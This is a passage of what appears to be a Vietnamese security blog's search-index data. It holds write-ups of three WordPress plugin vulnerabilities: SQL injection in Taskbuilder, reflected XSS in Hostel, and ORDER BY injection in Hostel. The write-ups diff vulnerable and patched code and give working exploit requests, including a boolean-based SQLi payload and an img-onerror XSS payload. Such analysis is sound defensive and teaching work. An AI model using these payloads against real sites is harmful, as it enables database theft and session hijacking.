·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a 